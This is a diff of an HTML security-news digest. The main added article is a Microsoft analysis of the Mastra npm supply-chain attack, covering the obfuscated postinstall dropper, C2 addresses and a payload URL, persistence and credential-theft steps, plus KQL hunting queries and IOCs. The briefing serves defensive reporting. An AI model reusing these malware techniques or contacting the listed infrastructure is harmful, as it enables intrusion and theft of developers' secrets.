@@ -59,58 +59,191 @@
         </style>
     </head>
     <body>
-        <h1>Security Briefing // 2026-06-17</h1>
+        <h1>Security Briefing // 2026-06-18</h1>
         <div class="menu">
-            <ul><li><button onclick="show('art-0')">CISA Warns of Actively Exploited Joomla JCE Flaw Allowing PHP Code Execution</button></li><li><button onclick="show('art-1')">Mythic Embarking on the Open Seas: Containerized Payload Delivery for Kubernetes Assessments</button></li><li><button onclick="show('art-2')">CISA warns of another cPanel plugin flaw exploited in attacks</button></li><li><button onclick="show('art-3')">JQ for Hackers</button></li><li><button onclick="show('art-4')">Microsoft Defender email security benchmarking: Key insights from one year of data</button></li><li><button onclick="show('art-5')">Public and Private Medical Community Targeted by China-Nexus Threat Actor Pursuing Artificial Intelligence, Cyber, Medical, and National Defense Research</button></li><li><button onclick="show('art-6')">CISA Adds Two Known Exploited Vulnerabilities to Catalog</button></li><li><button onclick="show('art-7')">CISA Adds Cisco, Chrome, and Arista Flaws to KEV Catalog Amid Active Exploitation</button></li><li><button onclick="show('art-8')">Who Runs the Ransomware Group ‘The Gentlemen?’</button></li><li><button onclick="show('art-9')">Canvas Breach Disrupts Schools & Colleges Nationwide</button></li></ul>
+            <ul><li><button onclick="show('art-0')">From package to postinstall payload: Inside the Mastra npm supply chain compromise</button></li><li><button onclick="show('art-1')">Microsoft Confirms RoguePlanet Defender Zero-Day, Says Patch is in Development</button></li><li><button onclick="show('art-2')">Microsoft working on Defender patch for RoguePlanet zero-day</button></li><li><button onclick="show('art-3')">Mythic Embarking on the Open Seas: Containerized Payload Delivery for Kubernetes Assessments</button></li><li><button onclick="show('art-4')">JQ for Hackers</button></li><li><button onclick="show('art-5')">CISA Adds Cisco, Chrome, and Arista Flaws to KEV Catalog Amid Active Exploitation</button></li><li><button onclick="show('art-6')">Who Runs the Ransomware Group ‘The Gentlemen?’</button></li><li><button onclick="show('art-7')">CISA Adds Three Known Exploited Vulnerabilities to Catalog</button></li><li><button onclick="show('art-8')">Canvas Breach Disrupts Schools & Colleges Nationwide</button></li><li><button onclick="show('art-9')">The Proliferation of DarkSword: iOS Exploit Chain Adopted by Multiple Threat Actors</button></li></ul>
         </div>
         
         <div id="art-0" class="article-body">
-            <h2 class="article-title">CISA Warns of Actively Exploited Joomla JCE Flaw Allowing PHP Code Execution</h2>
-            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/06/cisa-warns-of-actively-exploited-joomla.html" target="_blank">Original Link</a></p>
-            <div class="content-text">The U.S. Cybersecurity and Infrastructure Security Agency (CISA) on Tuesday [added](https://www.cisa.gov/news-events/alerts/2026/06/16/cisa-adds-one-known-exploited-vulnerability-catalog) a maximum-severity security flaw impacting Widget Factory Joomla Content Editor (JCE) to its Known Exploited Vulnerabilities (KEV) catalog, citing evidence of active exploitation.
-The vulnerability, tracked as [CVE-2026-48907](https://www.cve.org/CVERecord?id=CVE-2026-48907) (CVSS score: 10.0), is a case of improper access control that could facilitate arbitrary code execution.
-"Widget Factory Joomla Content Editor contains an improper access control vulnerability which could allow for upload and execution of PHP code via the creation of new editor profiles for unauthenticated users," CISA [said](https://www.cisa.gov/known-exploited-vulnerabilities-catalog).
-According to a description of the vulnerability published on CVE.org, the issue resides in the JCE editor extension for Joomla, allowing a bad actor to create new editor profiles for unauthenticated users, effectively paving the way for PHP code upload and execution.
-The issue impacts JCE versions from 1.0.0 through 2.9.99.4. It has been patched in version 2.9.99.5, released on June 3, 2026. In its release notes, Widget Factory [said](https://www.joomlacontenteditor.net/support/changelog/editor#29995) "insufficient access controls permitted unauthenticated users to upload editor profiles."
-There is currently no information on how the vulnerability is being exploited in the wild. Federal Civilian Executive Branch (FCEB) agencies have been ordered to apply the fixes by June 19, 2026.
-Multiple Campaigns Target WordPress Sites
-The disclosure comes as Sansec [detailed](https://thehackernews.com/2026/06/popular-wordpress-plugin-scripts.html) a new supply chain attack campaign that targeted over 1 million sites using OptinMonster, TrustPulse, and PushEngage WordPress plugins, with the threat actors injecting malicious JavaScript that "waits for a logged-in administrator, creates a backdoor admin account, and installs a self-hiding backdoor plugin."
-In another campaign, unknown attackers have been found to compromise a WordPress site to embed a fake WordPress plugin named "Beloved PBN Entegrasyonu" that stealthily beaconed the site's URL to an external API upon every page load and injected arbitrary HTML or JavaScript returned by the server into the web page's footer.
-Exactly how the attackers breached the website is unclear, but the access is said to have enabled them to stage two PHP web shells as raw executable code with the "wp_posts" database records and granted them the ability to interact with the scripts over HTTP. This, in turn, facilitated unrestricted read/write access to the entire server file system without requiring any authentication.
-Specifically, the database-resident payloads allow the threat actor to perform file actions, such as read, write, edit, or delete any file on the server, browse directories across the entire server, change file permissions, rename files, create new files and folders, and upload files from their own computer.
-"Every visitor to the compromised site received injected PBN outbound links in their page source on every page load, directly damaging the site's search rankings and risking a manual penalty in Google Search Console," Sucuri researcher Puja Srivastava [said](https://blog.sucuri.net/2026/06/wordpress-pbn-plugin-drops-dual-webshells-via-database-injection.html).
-"The campaign is operated by a Turkish-speaking threat actor and is built around a classic SEO monetization scheme: hidden backlink injection for a Private Blog Network (PBN), most likely tied to the gambling and adult affiliate niche."
-[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
+            <h2 class="article-title">From package to postinstall payload: Inside the Mastra npm supply chain compromise</h2>
+            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/06/17/postinstall-payload-inside-mastra-npm-supply-chain-compromise/" target="_blank">Original Link</a></p>
+            <div class="content-text">Microsoft Threat Intelligence observed a large-scale npm supply chain attack affecting 140+ packages across the mastra and @mastra scopes on the npm registry. Microsoft shared its findings with the npm security team, and the compromised packages have been removed and the attacker’s publish access to the @mastra scope has been revoked. The compromise originated from the takeover of the ehindero npm maintainer account, which had publish rights across the Mastra ecosystem and was used to publish poisoned package versions that introduced easy-day-js, a malicious typosquat of the popular dayjs library.
+Once installed, easy-day-js triggered a postinstall hook that executed an obfuscated dropper script, disabled Transport Layer Security (TLS) certificate verification, contacted attacker-controlled command-and-control (C2) infrastructure, downloaded a second-stage payload, and executed the payload as a detached hidden process. The activity followed a coordinated staged delivery pattern, with a clean bait version published first, followed by a weaponized version and rapid publication of the compromised Mastra packages.
+Because the payload executes during installation, any developer workstation or continuous integration and continuous delivery (CI/CD) pipeline that ran npm install or npm update after the compromised versions were published was potentially exposed, regardless of whether the package was imported in application code. This created risk to credentials, tokens, build environments, and downstream software integrity. Microsoft Defender Antivirus, Microsoft Defender for Endpoint, and Microsoft Defender XDR provide detections and hunting coverage for suspicious Node.js execution, malicious package behavior, reflective code loading, persistence activity and command-and-control communication.
+Attack chain overview
+At a high level, the attack progressed through six phases:
+- Account compromise: The attacker gained control of the ehindero npm account , a listed maintainer with publish rights across the entire @mastra scope.
+- Typosquat creation: The attacker published easy-day-js, a package impersonating the legitimate dayjs library (57M+ weekly downloads), using a coordinating anonymous email account ).
+- Mass poisoning: Using the compromised account, the attacker published new versions of 140+packages across the @mastra scope, each injected with easy-day-js@^1.11.21 as a new dependency. All poisoned versions were tagged as latest.
+- Delivery: Developers and CI/CD pipelines running npm install automatically resolved to the compromised versions. The semantic versioning (SemVer) range ^1.11.21 resolved to 1.11.22, the version containing the malicious postinstall hook.
+- Execution: The postinstall hook executed an obfuscated 4,572-byte dropper that disabled TLS verification, dropped tracking markers, and contacted the C2 server.
+- Second-stage payload: The dropper fetched executable code from the C2 server, wrote it as a randomly named .js file, and spawned it as a fully detached, window-hidden Node.js process.
+Discovery and initial indicators
+Microsoft Threat Intelligence identified the compromise through anomalous publishing patterns on the mastra package. All previous versions of mastra (through v1.13.0) were published through GitHub Actions OpenID Connect (OIDC), the legitimate CI/CD pipeline. Version 1.13.1 was manually published by ehindero using a Tutamail address, an anonymous email service.
+The only change between mastra@1.13.0 and mastra@1.13.1 was the addition of easy-day-js@^1.11.21 as a dependency. No corresponding code changes were present in the Mastra GitHub repository. Both the compromised publisher (ehindero2016@tutamail.com) and the typosquat publisher (sergey2016@tutamail.com) used the same anonymous email provider, Tutamail.
+Dependency injection: the poisoned package.json
+The compromised mastra@1.13.1 package.json reveals the injected dependency alongside the anomalous publisher metadata:
+The easy-day-js dependency was not present in any prior versions of mastra npm packages. Its addition, paired with the SemVer range ^1.11.21, ensures that the npm resolves to the weaponized 1.11.22 release.
+Typosquat analysis: easy-day-js
+The easy-day-js package is a deliberate impersonation of the legitimate dayjs library:
+| Attribute | Legitimate dayjs | Malicious easy-day-js |
+| Maintainer | iamkun <kunhello@outlook[.]com> | sergey2016 <sergey2016@tutamail[.]com> |
+| Claimed author | iamkun | iamkun (impersonated) |
+| Repository URL | github.com/iamkun/dayjs | github.com/iamkun/dayjs (copied) |
+| Weekly downloads | 57,251,792 | newly created |
+| Version count | 89+ versions since 2018 | 2 versions (both June 16, 2026) |
+| postinstall script | None | node setup.cjs –no-warnings (v1.11.22) |
+Staged delivery pattern
+The typosquat used a two-phase delivery strategy:
+- Phase 1 (clean bait): easy-day-js@1.11.21 was published at 07:05 UTC on June 16, 2026. This version contained only legitimate dayjs code with no postinstall hook.
+- Phase 2 (weaponization): easy-day-js@1.11.22 was published at 01:01 UTC on June 17, 2026, adding the setup.cjs payload and the postinstall hook. The dayjs.min.js file is byte-identical between both versions, confirming only the dropper was added.
+The weaponized package.json in version 1.11.22 exposes the postinstall hook:
+Obfuscation and payload analysis
+Stage 0: Obfuscated dropper (setup.cjs)
+The setup.cjs payload is protected with JavaScript obfuscation using rotated string arrays and a custom base64 decoder function:
+The obfuscation technique uses a common pattern: an array of 40 Base64-encoded strings is shuffled at initialization using a numeric seed (0x4c11d), then accessed through a decoder function that performs Base64 decoding with character substitution. This prevents static analysis tools from extracting meaningful strings.
+Stage 1: String table decryption
+Decoding the rotated string array reveals the payload’s true capabilities:
+Key decoded strings include the secondary C2 address (23.254.164[.]123:443), Node.js built-in module references (node:child_process, node:os), and file system operations (writeFileSync, rmSync).
+Stage 2: Deobfuscated payload logic
+After resolving all string references and control flow, the full payload logic emerges as a five-step attack sequence:
+TLS bypass to self-deletion
+Step 1: Disable TLS verification. The payload sets NODE_TLS_REJECT_UNAUTHORIZED to ‘0’, disabling certificate validation for all HTTPS requests in the Node.js process. This enables communication with the C2 server without valid certificates.
+Step 2: Drop filesystem markers. Two tracking files are written to the OS temp directory: $TMPDIR/.pkg_history contains the install path of the compromised package, and $TMPDIR/.pkg_logs contains the package name encoded with XOR 0x80:
+Step 3: Fetch second-stage payload. The dropper issues a GET request to hxxps://23.254.164[.]92:8000/update/49890878 and reads the response body as text.
+The second-stage payload is a ~41 KB cross-platform Node.js tasking client. Unlike a fire-and-forget stealer, the implant installs sign-in persistence, sends a Start beacon to the C2, then enters a repeated Check poll loop. Tasks returned by the server are dispatched to built-in runners (a Node runner and a Shell runner), and it honors configuration update and exit commands, meaning the operator can push and execute arbitrary follow-on code on the host at any time. On Windows, the payload additionally executes reflective .NET assembly injection for in-memory code execution.
+Step 3.A: Windows execution chain. On Windows, the payload performs host reconnaissance and reflective in-memory code execution before establishing persistence.
+The payload enumerates all installed applications across three sources—Start Menu entries (Get-StartApps), registry Uninstall keys, and UWP packages (Get-AppxPackage)—to fingerprint the compromised host:
+Each enumeration is wrapped in try/catch with silent error handling. The deduplicated results are exfiltrated back to the C2 for victim profiling, enabling the attacker to identify installed security products and high-value targets.
+A second PowerShell script receives two C2 endpoint URLs through the SCRIPT_ARGS environment variable. It disables SSL certificate validation and defines an HTTP POST function that Base64-encodes request bodies using a legacy IE8 User-Agent string:
+The first C2 request downloads a .NET DLL that is loaded directly into memory via reflection, completely bypassing disk-based detection. The script resolves the Extension.SubRoutine class and invokes its Run2 method with a second downloaded payload, the path to cmd.exe, and the C2 callback address:
+This pattern is consistent with process injection, where the payload is injected into a cmd.exe process that communicates back to the C2 over HTTPS (port 443). The entire chain is fileless—no artifacts are written to disk.
+Step 3.B: Cross-platform persistence. The implant installs login persistence on all three major operating systems, using a consistent NVM/Node masquerade theme across platforms:
+| OS | Persistence mechanism | Drop location | Artifact name |
+| Windows | Registry Run key (HKCU\…\CurrentVersion\Run) | C:\ProgramData\NodePackages\ | NvmProtocal |
+| macOS | LaunchAgent (RunAtLoad) | ~/Library/NodePackages/ | com.nvm.protocal.plist |
+| Linux | systemd user unit (WantedBy=default.target) | ~/.config/systemd/nvmconf/ | nvmconf.service |
+On Windows, the Run key launches a hidden PowerShell process that invokes Node.js:
+On Linux, the systemd user unit restarts the implant on failure with a 5-second delay:
+All three persistence paths drop the implant as protocal.cjs (a deliberate misspelling) into directories named to mimic legitimate Node.js installations. The value name NvmProtocal, the macOS label com.nvm.protocal, and the Linux unit nvmconf.service are deliberately designed to blend into a developer workstation.
+Step 3.C: Collection and exfiltration. The implant performs the following collection before exfiltrating to the C2:
+- Cryptocurrency wallet inventory: A hardcoded list of 166 wallet browser-extension IDs (MetaMask, Phantom, Coinbase Wallet, Binance Wallet, TronLink, and others) is matched against installed extensions across Chrome, Edge, and Brave profiles.
+- Browser history: Each profile’s History SQLite database is copied to a temp directory prefixed with browser-hist- and queried through node:sqlite.
+- Host reconnaissance: Gather hostname, architecture, platform, user ID, installed applications, and running processes.
+Collected data is exfiltrated using a custom ICAP-style protocol over HTTPS POST (reqmod, PrimaryUrl, SecondaryUrl headers), with hostnames resolved through node:dns and traffic carrying a spoofed legacy IE8 User-Agent string.
+Step 4: Writing and executing the payload. The downloaded code is written to a file with a cryptographically random name (<12 random hex bytes>.js) in the OS temp directory, then spawned as a detached, window-hidden Node.js process using child_process.spawn with unref().
+Step 5: Self-deletion. The dropper removes itself (fs.rmSync(__filename)) to eliminate forensic evidence from the installed package directory.
+Timeline analysis
+Every package published by the ehindero account contained easy-day-js as an injected dependency. Packages last published by GitHub Actions CI/CD or other legitimate maintainers were not affected.
+Attack timeline
+| Timestamp (UTC) | Event |
+| June 16, 07:05 | easy-day-js@1.11.21 published (clean bait, no payload) |
+| June 17, 01:01 | easy-day-js@1.11.22 published (adds postinstall with setup.cjs) |
+| June 17, 01:20 | mastra@1.13.1 and 140+ other @mastra/* packages published with easy-day-js dependency |
+** Microsoft Threat Intelligence monitoring observed easy-day-js@1.11.22 at 01:07 UTC and mastra@1.13.1 at 01:28 UTC on June 17, 2026
+Mitigation and protection guidance
+Microsoft recommends the following mitigations to reduce the impact of this threat:
+- Review dependency trees for direct or transitive usage of affected @mastra packages at the compromised versions listed above.
+- Check for the presence of easy-day-js in node_modules/ or package-lock.json files across your projects and CI/CD environments.
+- Pin known-good package versions where possible. For mastra, version 1.13.0 and earlier are unaffected. For @mastra/core, version 1.42.0 and earlier are unaffected.
+- Run npm install with –ignore-scripts to prevent automatic execution of postinstall hooks during dependency installation.
+- Check systems for indicators of compromise (IOC) artifacts: Look for $TMPDIR/.pkg_history, $TMPDIR/.pkg_logs, and unexpected .js files in the user’s home or temp directories.
+- Rotate any credentials, tokens, or API keys that may have been present on systems where the compromised packages were installed.
+- Block the C2 IP addresses 23.254.164[.]92 and 23.254.164[.]123 at the network perimeter.
+- Audit CI/CD logs for unexpected outbound connections to the C2 IP addresses or suspicious postinstall script execution.
+- Enable cloud-delivered protection in Microsoft Defender Antivirus or equivalent antivirus protection.
+Microsoft Defender XDR detections
+Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, and apps to provide integrated protection against attacks like the threat discussed in this blog.
+| Tactic | Observed activity | Microsoft Defender coverage |
+| Initial access | Suspicious script execution during npm install or package lifecycle activity | Microsoft Defender Antivirus – Trojan:JS/NpmStealz.Z!MTB – Trojan:JS/NpmStealz.ZA!MTB Microsoft Defender for Endpoint – Suspicious Node.js process behavior – Suspicious Node.js script execution |
+| Execution ( Stage 1 ) | Postinstall hook automatically executes obfuscated setup.cjs dropper (4,572 bytes) during npm install; | Microsoft Defender for Endpoint – Suspicious Node.js process behavior – Suspicious Node.js script execution |
+| Execution / Defense evasion (Stage 2) | Second-stage payload: Reflective .NET assembly injection: PowerShell downloads DLL, loads via [Reflection.Assembly]::Load(), invokes Extension.SubRoutine.Run2 method to inject payload into cmd.exe process; entire chain is fileless | Microsoft Defender Antivirus Trojan:JS/NpmSteal.DB!MTB Trojan:PowerShell/PsExec.DE!MTB Microsoft Defender for Endpoint -Process loaded suspicious .NET assembly -A process was injected with potentially malicious code -Reflective code loading (Fileless In-Memory Execution) Microsoft Defender for Cloud -Possible AI Tools Reconnaissance Detected -Possible Secret Reconnaissance Detected -Access to cloud metadata service detected -Possible Post-Compromise Activity Detected in CICD Runner |
+| Persistence | Registry Run key created, executing hidden PowerShell that launches protocal.cjs on every user login | Microsoft Defender for Endpoint – Anomaly detected in ASEP registry |
+| Command and control | GET request to hxxps://23.254.164[.]92:8000/update/49890878 and reads the response body as text. | Microsoft Defender for Endpoint – Command-line process communicating with malicious network endpoint |
+Microsoft Security Copilot
+Security Copilot customers can use the standalone experience to [create their own prompts](https://learn.microsoft.com/copilot/security/prompting-security-copilot#create-your-own-prompts) or run the following [prebuilt promptbooks](https://learn.microsoft.com/copilot/security/using-promptbooks) to automate incident response or investigation tasks related to this threat:
+- Incident investigation
+- Microsoft User analysis
+- Threat actor profile
+- Threat Intelligence 360 report based on MDTI article
+- Vulnerability impact assessment
+Note that some promptbooks require access to plugins for Microsoft products such as Microsoft Defender XDR or Microsoft Sentinel.
+Advanced hunting
+The following KQL queries can be used in Microsoft Defender XDR Advanced Hunting to identify potential exposure to this supply chain compromise.
+Detect postinstall execution of setup.cjs
+DeviceProcessEvents | where Timestamp > ago(7d) | where FileName in ("node", "node.exe") | where ProcessCommandLine has "setup.cjs" or ProcessCommandLine has "easy-day-js" | where ProcessCommandLine has “--no-warnings” | project Timestamp, DeviceName, AccountName, ProcessCommandLine, FolderPath, InitiatingProcessFileName | sort by Timestamp desc |
+Outbound connections to C2 infrastructure
+1 2 3 4 5 6 | DeviceNetworkEvents | where Timestamp > ago(7d) | where RemoteIP in ("23.254.164.92", "23.254.164.123") | project Timestamp, DeviceName, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessFileName, InitiatingProcessCommandLine | sort by Timestamp desc |
+Indicators of compromise (IOC)
+Network indicators
+| Indicator | Type | Description |
+| 23.254.164.92 | IP address | Primary C2 server |
+| 23.254.164.123 | IP address | Secondary C2 address (from deobfuscated strings) |
+| https[:]//23[.]254[.]164[.]92:8000/update/49890878 | URL | Payload download endpoint |
+File indicators
+| Indicator | Type | Description |
+| B122A9873BEDF145AE2A7FD024B5F309007DBB025149F4DC4AC3F7E4F32A36A4 | SHA256 | setup.cjs (malicious postinstall dropper) |
+| AE70DD4F6BC0D1C8C2848E4E6B51934626C4818DCB5AF99D080DDBD7DC337185 | SHA256 | easy-day-js-1.11.22.tgz (weaponized tarball) |
+| 4A8860240E4231C3A74C81949BE655A28E096A7D72F38FBE84E5B37636B98417 | SHA256 | easy-day-js-1.11.21.tgz (clean bait tarball) |
+| B73DE25C053C3225A077738A1FCBD9CA6966D7B3CD6F5494A30F0AA0EAE55C7E | SHA256 | mastra-1.13.1.tgz (compromised CLI tarball) |
+| 221c45a790dec2a296af57969e1165a16f8f49733aeab64c0bbd768d9943badf | SHA256 | protocol.cjs |
+Host indicators
+| Indicator | Type | Description |
+| $TMPDIR/.pkg_history | File artifact | Contains the install path of the compromised package |
+| $TMPDIR /.pkg_logs | File artifact | Contains XOR 0x80 encoded string “easy-day-js” |
+| <homedir>/<random_hex>.js | File artifact | Downloaded second-stage payload |
+Package indicators
+| Indicator | Type | Description |
+| easy-day-js | npm package | Malicious typosquat of dayjs |
+| sergey2016 | npm account | Publisher of easy-day-js |
+| ehindero | npm account | Compromised publisher of 140+ Mastra packages |
+References
+This research is provided by Microsoft Defender Security Research, Suriyaraj Natarajan, Sagar Patil, Rajesh Kumar Natarajan, Mahesh Mandava, Arvind Gowda, and with contributions from members of Microsoft Threat Intelligence.
+Learn more
+For the latest security research from the Microsoft Threat Intelligence community, check out the [Microsoft Threat Intelligence Blog](https://aka.ms/threatintelblog).
+To get notified about new publications and to join discussions on social media, follow us on [LinkedIn](https://www.linkedin.com/showcase/microsoft-threat-intelligence), [X (formerly Twitter)](https://x.com/MsftSecIntel), and [Bluesky](https://bsky.app/profile/threatintel.microsoft.com).
+To hear stories and insights from the Microsoft Threat Intelligence community about the ever-evolving threat landscape, listen to the [Microsoft Threat Intelligence podcast](https://thecyberwire.com/podcasts/microsoft-threat-intelligence).
+Review our documentation to learn more about our real-time protection capabilities and see how to enable them within your organization.
+- Explore
+[how to build and customize agents with Copilot Studio Agent Builder](https://eurppc-word-edit.officeapps.live.com/we/%E2%80%A2%09https:/learn.microsoft.com/en-us/microsoft-365-copilot/extensibility/copilot-studio-agent-builder) [Microsoft 365 Copilot AI security documentation](https://learn.microsoft.com/en-us/copilot/microsoft-365/microsoft-365-copilot-ai-security)[How Microsoft discovers and mitigates evolving attacks against AI guardrails](https://www.microsoft.com/en-us/security/blog/2024/04/11/how-microsoft-discovers-and-mitigates-evolving-attacks-against-ai-guardrails/)- Learn more about
+[securing Copilot Studio agents with Microsoft Defender](https://learn.microsoft.com/en-us/defender-cloud-apps/ai-agent-protection) - Evaluate your AI readiness with our latest
+[Zero Trust for AI workshop](https://microsoft.github.io/zerotrustassessment/). - Learn more about
+[Protect your agents in real-time during runtime (Preview)](https://learn.microsoft.com/en-us/defender-cloud-apps/real-time-agent-protection-during-runtime)</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
         <div id="art-1" class="article-body">
-            <h2 class="article-title">Mythic Embarking on the Open Seas: Containerized Payload Delivery for Kubernetes Assessments</h2>
-            <p class="source-link">Source: Research & Tradecraft Archives - SpecterOps | <a href="https://specterops.io/blog/2026/06/16/mythic-embarking-on-the-open-seas-containerized-payload-delivery-for-kubernetes-assessments/" target="_blank">Original Link</a></p>
-            <div class="content-text"><p>TL;DR: We created new Mythic extensions to simplify container-centric assessments, including Kubernetes and Docker-based ceded access workflows. These tools help operators wrap Mythic payloads in OCI-compatible containers and publish them to a self-hosted registry. Check the container_wrapper and container_registry on GitHub. Introduction There are quite a few command and control (C2) frameworks available for teams [&#8230;]</p>
-<p>The post <a href="https://specterops.io/blog/2026/06/16/mythic-embarking-on-the-open-seas-containerized-payload-delivery-for-kubernetes-assessments/">Mythic Embarking on the Open Seas: Containerized Payload Delivery for Kubernetes Assessments</a> appeared first on <a href="https://specterops.io">SpecterOps</a>.</p>
-
-[Full content could not be extracted. Visit source for details.]</div>
+            <h2 class="article-title">Microsoft Confirms RoguePlanet Defender Zero-Day, Says Patch is in Development</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/06/microsoft-confirms-rogueplanet-defender_02022423645.html" target="_blank">Original Link</a></p>
+            <div class="content-text">Microsoft has formally disclosed that it's working to release a patch to address a Defender zero-day codenamed [RoguePlanet](https://thehackernews.com/2026/06/microsoft-defender-rogueplanet-zero-day.html).
+The vulnerability has now been assigned the CVE identifier [CVE-2026-50656](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-50656) (CVSS score: 7.8), with the tech giant describing it as a privilege escalation flaw.
+"Microsoft is aware of an elevation of privilege in the Microsoft Malware Protection Engine in Microsoft Defender, publicly referred to as 'RoguePlanet,'" the company said. "We are working to provide a high-quality security update that addresses this vulnerability."
+The development comes nearly a week after a security researcher named Chaotic Eclipse (aka Nightmare-Eclipse) released RoguePlanet, calling the exploit a case of a race condition that grants attackers a shell with SYSTEM-level privileges.
+"The exploit is a race condition, so it's a hit or miss," the researcher noted. "I have managed to get a 100% success rate on some machines while it struggled to work on others."
+In an update shared Tuesday, the researcher [added](https://blog.projectnightcrawler.dev/posts/2026-06-16-rogueplanet-another-quick-statement/): "I forgot to add one thing, surprisingly, the PoC for RoguePlanet works regardless if real-time protection is on or not, which is hilarious. I think it even works in the case of passive mode, but not really sure, haven't tested that."
+Microsoft told The Hacker News last week that it's aware of the reported vulnerability and that it's "actively investigating the validity and potential applicability of these claims."
+RoguePlanet is the fourth Defender vulnerability disclosed by Chaotic Eclipse after BlueHammer (CVE-2026-33825), UnDefend (CVE-2026-45498), and RedSun (CVE-2026-41091), all of which have since been patched by Microsoft.
+[Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
         <div id="art-2" class="article-body">
-            <h2 class="article-title">CISA warns of another cPanel plugin flaw exploited in attacks</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/cisa-warns-of-another-actively-exploited-cpanel-plugin-flaw/" target="_blank">Original Link</a></p>
-            <div class="content-text">The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has given U.S. government agencies three days to secure their servers against an actively exploited vulnerability ([CVE-2026-54420](https://nvd.nist.gov/vuln/detail/CVE-2026-54420)) in the LiteSpeed cPanel user-end plugin.
-Tracked as [CVE-2026-48172](https://www.cve.org/CVERecord?id=CVE-2026-48172), this high-severity vulnerability was reported by Namecheap and allows attackers with FTP or web shell access to escalate privileges to root on shared hosting servers running CloudLinux/CageFS.
-This vulnerability affects all user-end plugin versions before 2.4.8 and stems from a 'UNIX symlink following' weakness.
-LiteSpeed flagged it as actively exploited in early June and [released urgent security updates](https://blog.litespeedtech.com/2026/06/01/security-update-for-litespeed-cpanel-plugin-2/), warning users to update the cPanel user-end plugin (bundled with the WHM plugin) to the latest version.
-Users are advised to use the following command to check if their server is vulnerable to attacks targeting the CVE-2026-48172 vulnerability:
-grep -rE 'cpanel_jsonapi_func=(generateEcCert|packageUserSize)|cert_action_entry .*geneccert' /usr/local/cpanel/logs/ /var/cpanel/logs/ 2>/dev/null
-"If this command results in any output, the vulnerability may have been exploited on your server. [..] To determine any damage done, examine the system logs for any actions taken by the detected IPs," LiteSpeed said. "This vulnerability is being actively exploited, and poses a risk for all user-end plugin versions prior to 2.4.8."
-On Monday, CISA [also added](https://www.cisa.gov/news-events/alerts/2026/06/15/cisa-adds-two-known-exploited-vulnerabilities-catalog) that the vulnerability to its [Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2026-48172) (KEV), ordering Federal Civilian Executive Branch (FCEB) agencies to secure their systems within three days, as required by Binding Operational Directive (BOD) 26-04.
-BOD 26-04 [was issued last Wednesday](https://www.bleepingcomputer.com/news/security/cisa-tells-govt-agencies-to-patch-critical-exploited-flaws-in-3-days/) (revoking the older BODs 19-02 and 22-01) and requires U.S. federal agencies to prioritize patching based on the risk of exploitation.
-Key factors to consider when assessing the risks include whether the security flaw is included in CISA's KEV catalog, whether the asset is publicly exposed online, whether exploitation can be automated for large-scale attacks, and whether successful exploitation grants attackers partial or total control of the targeted system.
-"This type of vulnerability is a frequent attack vector for malicious cyber actors and poses significant risks to the federal enterprise," the cybersecurity agency warned yesterday. "Follow applicable BOD 26-04 guidance for cloud services or discontinue use of the product if mitigations are unavailable. Stakeholders are responsible for evaluating each asset's internet exposure and ensuring adherence to BOD 26-04 patching guidelines."
-Last month, CISA warned federal agencies [to patch another LiteSpeed cPanel vulnerability](https://www.bleepingcomputer.com/news/security/cisa-gives-feds-3-days-to-patch-actively-exploited-cpanel-plugin-flaw/) (CVE-2026-48172), which unauthenticated attackers exploited to execute arbitrary scripts with root privileges.
+            <h2 class="article-title">Microsoft working on Defender patch for RoguePlanet zero-day</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/microsoft/microsoft-working-on-defender-patch-for-rogueplanet-zero-day/" target="_blank">Original Link</a></p>
+            <div class="content-text">Microsoft confirmed that it's working on a security patch for a Defender zero-day vulnerability named "RoguePlanet," disclosed one week ago.
+The security researcher who published [a RoguePlanet exploit](https://www.bleepingcomputer.com/news/microsoft/microsoft-defender-rogueplanet-zero-day-grants-system-privileges/) during the June 2026 Patch Tuesday (known as Nightmare Eclipse) said it affects fully patched Windows 10 and Windows 11 devices and allows attackers to spawn command prompts with SYSTEM privileges via a Microsoft Defender race condition.
+He shared a proof-of-concept exploit in a self-hosted Git repository, claiming that Microsoft had previously targeted and removed their repos hosting exploits on GitHub and GitLab.
+"The exploit is a race condition, so it's a hit or miss. I have managed to get a 100% success rate on some machines while it struggled to work on others," Nightmare Eclipse said. "The PoC for RoguePlanet works regardless if real time protection is on or not," they added [in a Tuesday update](https://blog.projectnightcrawler.dev/posts/2026-06-16-rogueplanet-another-quick-statement/).
+"Microsoft is aware of the reported vulnerability and is actively investigating the validity and potential applicability of these claims. Microsoft is committed to investigating security issues and updating impacted products to protect customers as soon as possible," a Microsoft spokesperson told BleepingComputer when asked for a statement at the time.
+Now tracked as CVE-2026-50656, waiting for a patch
+On Tuesday, one week after the RoguePlanet flaw was disclosed, Microsoft assigned the CVE-2026-50656 ID to this security flaw and confirmed it's currently working on a patch, but didn't acknowledge that Nightmare Eclipse was the one who found the vulnerability.
+"Microsoft is aware of an elevation of privilege in the Microsoft Malware Protection Engine in Microsoft Defender publicly referred to as 'RoguePlanet,' it said in an advisory published yesterday. "We are working to provide a high quality security update that addresses this vulnerability. We will provide information in this CVE when the update is available."
+The RoguePlanet release is part of an ongoing dispute between Nightmare Eclipse and Microsoft over the latter's bug bounty and vulnerability disclosure practices.
